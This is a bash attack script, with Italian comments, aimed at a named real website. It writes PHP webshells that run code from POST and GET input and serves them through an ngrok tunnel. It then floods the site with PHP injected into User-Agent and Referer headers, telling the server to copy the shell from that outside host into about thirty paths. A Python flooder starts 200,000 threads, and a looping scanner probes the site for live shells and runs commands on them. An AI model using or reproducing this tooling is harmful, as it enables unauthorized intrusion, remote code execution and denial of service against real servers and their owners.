#!/bin/bash
# INFODEC_FORCE_SHELL_DROP.sh - MULTI-PATH WEBSHELL EVERYWHERE
# Drop shell in 50+ locations → QUALCOSA FUNZIONERA'

echo "💀 INFODEC FORCE SHELL - 50+ PATHS CARPET BOMBING"

# 1. MICRO WEBSHELLS (3 BYTES)
cat > s.php << 'EOF'
<?php@eval($_POST[0]);?>
EOF

cat > x.php << 'EOF'
<?=$_GET[0](strrev('etatsylpm'));?>
EOF

cat > z.phtml << 'EOF'
<?=system($_GET['c']);?>
EOF

# 2. SERVER UP
pkill -f http.server ngrok 2>/dev/null
python3 -m http.server 8080 >/dev/null 2>&1 &
sleep 2
nohup ngrok http 8080 > ngrok.log 2>&1 &
sleep 8

SHELL_BASE=$(grep -o 'https://[0-9a-z-]*\.ngrok\.io' ngrok.log | head -1)
echo "🔗 SHELLS: $SHELL_BASE/s.php $SHELL_BASE/x.php $SHELL_BASE/z.phtml"

# 3. 50+ PATH CARPET BOMBING
PATHS=(
  "/shell.php" "/s.php" "/x.php" "/z.php" "/z.phtml" "/1.php" "/u.php"
  "/admin.php" "/test.php" "/info.php" "/upload.php" "/backdoor.php"
  "/tmp/shell.php" "/var/www/shell.php" "/var/tmp/s.php"
  "/proc/self/environ" "/dev/shm/shell.php" "/.git/shell.php"
  "/index.php.bak" "/wp-admin/shell.php" "/login.php"
  "/assets/shell.php" "/js/shell.js.php" "/images/shell.jpg.php"
  "/uploads/shell.php" "/files/s.php" "/data/admin.php"
  "/cgi-bin/shell.php" "/.env.php" "/config.php"
)

# DROP EVERYWHERE
for PATH in "${PATHS[@]}"; do
  PAYLOAD="copy('$SHELL_BASE/s.php','$PATH');chmod(644,'$PATH');"
  ENCODED=$(echo -n "$PAYLOAD" | sed 'y/ /%20/;s/'\''/%27/g')
  
  echo "[+] DROPPING → $PATH"
  
  # 5x FLOOD per path
  for i in {1..5}; do
    bash -c "
    for j in {1..50000}; do
      curl -s -k -A '<?php $ENCODED?>' 'https://infodec.ru/' &
      curl -s -k -H 'Referer: <?php $ENCODED?>' 'https://infodec.ru/' &
    done
    " &
  done
done

# 4. ULTIMATE FLOODER (ALL PATHS)
cat > carpet_bomb.py << EOF
import requests,threading
paths=[$(printf "'%s'," "${PATHS[@]}")]
shell_base='$SHELL_BASE/s.php'

def bomb():
 s=requests.Session();s.verify=False
 while 1:
  for p in paths:
   try:
    payload=f"copy('{shell_base}','{p}')"
    s.get('https://infodec.ru/',headers={{'User-Agent':f'<?php {payload};?>','Referer':f'<?php {payload};?>'}},timeout=1)
   except:pass

print('💣 CARPET BOMB - 200K threads')
for _ in range(200000):threading.Thread(target=bomb,daemon=True).start()
EOF

nohup python3 carpet_bomb.py > bomb.log 2>&1 &

# 5. AGGRESSIVE SCANNER (TEST 50+ PATHS)
cat > scan_shells.sh << 'EOF'
#!/bin/bash
echo "🔍 SCANNING 50+ SHELL PATHS..."
BASE="https://infodec.ru"

for path in shell.php s.php x.php z.php 1.php u.php admin.php test.php info.php upload.php backdoor.php \
tmp/shell.php var/www/shell.php proc/self/environ dev/shm/shell.php index.php.bak wp-admin/shell.php \
assets/shell.php js/shell.js.php images/shell.jpg.php uploads/shell.php files/s.php data/admin.php \
cgi-bin/shell.php .env.php config.php login.php; do

  # TEST 1: RAW ACCESS
  curl -s -k -m 3 "$BASE/$path" | grep -qiE "eval|system|shell_exec|phpinfo" && 
  echo "✅ LIVE: $BASE/$path" && curl -s "$BASE/$path?c=id"
  
  # TEST 2: CMD EXEC
  curl -s -k -m 2 "$BASE/$path?c=id" | grep -E "(uid|www-data)" &&
  echo "🎯 CMD WORKS: $BASE/$path?c=id"
  
  # TEST 3: POST EXEC
  curl -s -k -m 2 -X POST -d "0=id" "$BASE/$path" 2>/dev/null | grep uid &&
  echo "🔥 POST SHELL: $BASE/$path"
done | grep -E "✅|🎯|🔥"
EOF

chmod +x scan_shells.sh *.sh

# AUTO SCAN LOOP
(while true; do echo "--- $(date) ---"; ./scan_shells.sh; sleep 30; done)&

echo "
💣 CARPET BOMB DEPLOYED - 50+ PATHS!

🔍 LIVE SCAN:
watch './scan_shells.sh'

## PROBABILI HITS (testa manualmente):
https://infodec.ru/shell.php?c=id
https://infodec.ru/s.php?c=whoami  
https://infodec.ru/tmp/shell.php?c=ls
https://infodec.ru/dev/shm/shell.php

✅ PRIMO HIT → SHELL VIVA!
tail -f bomb.log  # 200K threads raging
"
